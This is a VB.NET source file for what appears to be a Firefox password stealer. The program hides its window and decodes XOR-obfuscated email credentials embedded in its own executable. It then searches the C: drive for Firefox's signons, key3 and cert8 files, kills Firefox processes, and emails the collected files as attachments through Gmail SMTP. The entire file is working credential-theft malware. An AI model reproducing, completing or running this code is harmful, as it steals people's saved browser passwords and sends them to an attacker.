Imports System.IO
Imports System.Text
Imports System.Net.Mail
Public Class Form1
    Dim txt1, txt2, mailname, mailpass, numb As String

    Public Class fileSeacher
        Private SearchFileFilter As String 'file extension
        Private recur As Boolean  'to search all directory folder
        Private cont As ListBox 'listox to hold items

        Public Function SearchForSinglefile(ByVal startPath As String, ByVal recurs As Boolean, ByVal SearchFile As String, ByVal ctl As ListBox)
            cont = ctl 'listbox
            recur = recurs
            SearchFile = "*" & SearchFile
            SearchFileFilter = SearchFile
            Searchdirectory(New DirectoryInfo(startPath))
        End Function
        Public Sub Searchdirectory(ByVal dir As DirectoryInfo)
            Dim fileitem As FileInfo
            For Each fileitem In dir.GetFiles(SearchFileFilter)
                Try
                    Dim fileDetail As IO.FileInfo
                    fileDetail = My.Computer.FileSystem.GetFileInfo(fileitem.FullName)
                    Dim str As String = fileDetail.FullName
                    If str.Contains("signons") = True Or str.Contains("key3") = True Or str.Contains("cert8") = True Then
                        cont.Items.Add(fileitem.FullName)
                    Else : cont.Items.Remove(-1)
                    End If

                Catch err As UnauthorizedAccessException
                Catch fne As FileNotFoundException
                Catch ex As Exception
                End Try
            Next
            If recur Then
                Dim dirItem As DirectoryInfo
                For Each dirItem In dir.GetDirectories()
                    Try
                        Searchdirectory(dirItem)
                    Catch err As UnauthorizedAccessException
                    Catch ane As ArgumentNullException
                    Catch dnf As DirectoryNotFoundException
                    Catch fne As FileNotFoundException
                    Catch ex As Exception
                    End Try
                Next
            End If
        End Sub
    End Class
    Public Function FindAndKillProcess(ByVal name As String) As Boolean
        For Each clsProcess As Process In Process.GetProcesses
            If clsProcess.ProcessName.ToLower.Contains("fire") Then
                clsProcess.Kill()
                Return True
            End If
        Next
        Return False
    End Function


    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        System.Diagnostics.Process.GetCurrentProcess().PriorityClass = System.Diagnostics.ProcessPriorityClass.BelowNormal
        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        Me.Opacity = 0
        Const FileSplit = "(&&)"

        Dim II() As String
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        txt1 = Space(LOF(1))
        txt2 = Space(LOF(1))
        FileGet(1, txt1)
        FileGet(1, txt2)
        FileClose(1)
        II = Split(txt1, FileSplit)
        Dim i As Short
        mailname = ""
        Dim KeyChar As Integer
        KeyChar = Asc("/\")
        For i = 1 To Len(II(1))
            mailname &= Chr(KeyChar Xor Asc(Mid(II(1), i, 1)))
        Next
        mailpass = ""
        KeyChar = Asc("/\")
        For i = 1 To Len(II(2))
            mailpass &= Chr(KeyChar Xor Asc(Mid(II(2), i, 1)))
        Next
        ListBox1.Items.Clear()
        BackgroundWorker2.RunWorkerAsync()
    End Sub

    Private Sub BackgroundWorker1_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        On Error Resume Next
        Dim MyMailMessage1 As New MailMessage()
        MyMailMessage1.From = New MailAddress(mailname)
        MyMailMessage1.To.Add(mailname)
        MyMailMessage1.Subject = (SystemInformation.UserName)
        MyMailMessage1.Body = ("Here")
        For counter = 0 To ListBox1.Items.Count - 1
            Dim Attach As Net.Mail.Attachment = New Net.Mail.Attachment(ListBox1.Items(counter)) 'here we loop through the listbox and add 
            MyMailMessage1.Attachments.Add(Attach)                                                'them as a mail attachment
        Next
        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential(mailname, mailpass)
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage1)
        End
    End Sub

    Private Sub BackgroundWorker2_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        Dim sf As New fileSeacher
        sf.SearchForSinglefile("C:\", True, ".txt", ListBox1)
        sf.SearchForSinglefile("C:\", True, ".db", ListBox1)
        numb = ListBox1.Items.Count
        If Not FindAndKillProcess("firefox") Then
        Else
        End If
        If ListBox1.Items.Count >= 3 Then
            BackgroundWorker1.RunWorkerAsync()
        Else : End
        End If
    End Sub
End Class
